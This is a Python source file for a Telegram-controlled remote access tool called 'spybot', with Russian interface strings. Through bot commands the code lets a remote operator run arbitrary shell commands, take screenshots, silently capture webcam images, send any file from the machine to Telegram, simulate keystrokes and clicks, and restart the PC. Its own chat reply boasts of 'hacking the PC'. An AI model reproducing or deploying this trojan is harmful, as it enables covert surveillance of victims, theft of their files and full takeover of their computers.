# Modules.
from telebot import * # Telegram module.
from json import load # Parse Json.
from messages.welcome import welcome as welcome_message # Welcome message.
from messages.help import _help as help_message # Help message.
from messages.about import about as about_message # About message.
from messages.credits import _credits as credits_message # Credits message.
from messages.commands import commands as commands_message # Commands message.
from assets import \
	_screenshot_win32, alert, speak, \
		ctime, system, press, \
			typewrite, startfile, cv2, \
				click, position, user \
					# Assets.



# Parse config.
def config(key):
	with open('config.json', 'r') as _config: return load(_config)[key]

# Spy-bot client.
spybot = TeleBot(config('Token'))

# Commands.
commands = {
	'start': 'start',
	'help': 'help',
	'about': 'about',
	'credits': 'credits',
	'screenshot': 'screenshot',
	'message': 'message',
	'say': 'say',
	'cmd': 'cmd',
	'press': 'press',
	'typewrite': 'typewrite',
	'click': 'click',
	'mousepos': 'mousepos',
	'startfile': 'startfile',
	'webcam': 'webcam',
	'getfile': 'getfile',
	'pc-username': 'username',
	'shutdown': 'shutdown',
	'commands': 'commands',
	'clear': 'clear'
}

start = commands['start']
_help = commands['help']
about = commands['about']
_credits = commands['credits']
screenshot = commands['screenshot']
message = commands['message']
say = commands['say']
cmd = commands['cmd']
_press = commands['press']
_typewrite = commands['typewrite']
_click = commands['click']
_startfile = commands['startfile']
webcam = commands['webcam']
clear = commands['clear']
getfile = commands['getfile']
mousepos = commands['mousepos']
pc_username = commands['pc-username']
shutdown = commands['shutdown']
_commands = commands['commands']

# Arguments missed.
some_arguments_missed = 'Какие-то аргументы не указаны... 😐'

# Start bot.
@spybot.message_handler(commands = [start])
def start_func(message): spybot.send_message(message.chat.id, welcome_message)

# Help.
@spybot.message_handler(commands = [_help])
def help_func(message): spybot.send_message(message.chat.id, help_message)

# About.
@spybot.message_handler(commands = [about])
def about_func(message): spybot.send_message(message.chat.id, about_message)

# Credits.
@spybot.message_handler(commands = [_credits])
def credits_func(message): spybot.send_message(message.chat.id, credits_message)

# Screenshot.
@spybot.message_handler(commands = [screenshot])
def screenshot_func(message):
	try:
		_screenshot_win32('screenshots\\screenshot.png')
	except FileExistsError:
		from os import remove

		remove('screenshots\\screenshot.png')
		_screenshot_win32('screenshots\\screenshot.png')

	spybot.send_photo(message.chat.id, open('screenshots\\screenshot.png', 'rb'), ctime())

# Message.
@spybot.message_handler(commands = [message])
def message_func(message):
	try:
		spybot.send_message(message.chat.id, f'Заголовок: {message.text.split()[1]}\nТекст: {message.text.split()[2]}\nТекст: {message.text.split()[3]}')
		alert(message.text.split()[2], message.text.split()[1], message.text.split()[3])
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, 'Подсказка:\n/message [Заголовок: строка][Текст: строка][Кнопка: строка].')

# Say.
@spybot.message_handler(commands = [say])
def say_func(message):
	try:
		spybot.send_message(message.chat.id, f'Текст: {message.text.split()[1]}')
		speak(message.text.split()[1])
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, 'Подсказка:\n/say [Текст: строка].')

# Command to cmd.
@spybot.message_handler(commands = [cmd])
def cmd_func(message):
	try:
		command = message.text.replace(' ', '_').split('!')
		spybot.send_message(message.chat.id, 'Комманда: {}'.format(command[1].replace('_', ' ')))
		system(command[1].replace('_', ' '))
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, 'Подсказка:\n/cmd [!][Комманда: строка].\n! - Разделитель.')

# Press key
@spybot.message_handler(commands = [_press])
def press_func(message):
	try:
		spybot.send_message(message.chat.id, f'Клавиша: {message.text.split()[1]}')
		press(message.text.split()[1])
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, 'Подсказка:\n/press [Клавиша: строка].')

# Write word.
@spybot.message_handler(commands = [_typewrite])
def typewrite_func(message):
	try:
		spybot.send_message(message.chat.id, f'Текст: {message.text.split()[1]}\nИнтервал: {message.text.split()[2]}')
		typewrite(message.text.split()[1], float(message.text.split()[2]))
	except (IndexError, ValueError) as error:
		if 'list' in str(error):
			spybot.send_message(message.chat.id, some_arguments_missed)
			spybot.send_message(message.chat.id, 'Подсказка:\n/typewrite [Текст: строка][Интервал: число].')

		elif 'float' in str(error):
			spybot.send_message(message.chat.id, 'Интервал должен быть цифрой!')

# Click.
@spybot.message_handler(commands = [_click])
def click_func(message):
	try:
		spybot.send_message(message.chat.id, f'X: {message.text.split()[1]}\nY: {message.text.split()[2]}\nКликов: {message.text.split()[3]}')
		click(int(message.text.split()[1]), int(message.text.split()[2]), int(message.text.split()[3]))
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, 'Подсказка:\n/click [X: число][Y: число][Кликов: число].')

# Mouse position.
@spybot.message_handler(commands = [mousepos])
def mousepos_func(message): spybot.send_message(message.chat.id, f'X: {list(position())[0]}\nY: {list(position())[1]}')

# Startfile.
@spybot.message_handler(commands = [_startfile])
def startfile_func(message):
	try:
		spybot.send_message(message.chat.id, f'Файл: {message.text.split()[1]}')
		startfile(message.text.split()[1])
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, 'Подсказка:\n/startfile [Файл: строка (путь)].')

# Webcam screenshot.
@spybot.message_handler(commands = [webcam])
def webcam_func(message):
	frames = 10 * 3
	cap = cv2.VideoCapture(0)
	for _ in range(frames): cap.read()
	ret, frame = cap.read()
	try:
		cv2.imwrite('webcam-screenshots\\webcam-screenshot.png', frame)
	except FileExistsError:
		from os import remove

		remove('webcam-screenshots\\webcam-screenshot.png')
		cv2.imwrite('webcam-screenshots\\webcam-screenshot.png', frame)

	finally:
		cap.release()
		spybot.send_photo(message.chat.id, open('webcam-screenshots\\webcam-screenshot.png', 'rb'), ctime())

# Get file from PC.
@spybot.message_handler(commands = [getfile])
def getfile_func(message):
	try:
		spybot.send_document(message.chat.id, open(message.text.split()[1], 'rb'))
	except FileNotFoundError: spybot.send_message(message.chat.id, 'Файл не найден... 😥')
	except PermissionError: spybot.send_message(message.chat.id, 'Windows не дала прав давать нам этот файл... 😥')
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, 'Подсказка:\n/getfile [Файл: строка].')

# Get username.
@spybot.message_handler(commands = [pc_username])
def pc_username_func(message): spybot.send_message(message.chat.id, f'Имя пользователя: {user()}')

# Shutdown.
@spybot.message_handler(commands = [shutdown])
def shutdown_func(message):
	spybot.send_message(message.chat.id, 'Выключаем пк...')
	system('shutdown /r')

# Commands.
@spybot.message_handler(commands = [_commands])
def commands_func(message): spybot.send_message(message.chat.id, commands_message)

# Clear folders.
@spybot.message_handler(commands = [clear])
def clear_func(message):
	from os import remove
	try:
		remove('screenshots\\screenshot.png')
		remove('webcam-screenshots\\webcam-screenshot.png')
	except FileNotFoundError: spybot.send_message(message.chat.id, 'Некоторые файлы не инициализированы.')
	finally:
		del remove
		spybot.send_message(message.chat.id, 'Папки очищены.')

# Speak.
@spybot.message_handler(content_types = ['text'])
def chatbot(message):
	if 'привет' in message.text.lower(): spybot.send_message(message.chat.id, 'Привет!')
	elif 'пока' in message.text.lower(): spybot.send_message(message.chat.id, 'Пока!')
	elif 'как дела' in message.text.lower(): spybot.send_message(message.chat.id, 'Хорошо!')
	elif 'что делаешь' in message.text.lower(): spybot.send_message(message.chat.id, 'Взламываю пк!')
	elif 'ок' in message.text.lower(): spybot.send_message(message.chat.id, 'Ок!')
	else: spybot.send_message(message.chat.id, 'Не понял тебя.')

# Run.
spybot.polling(True)
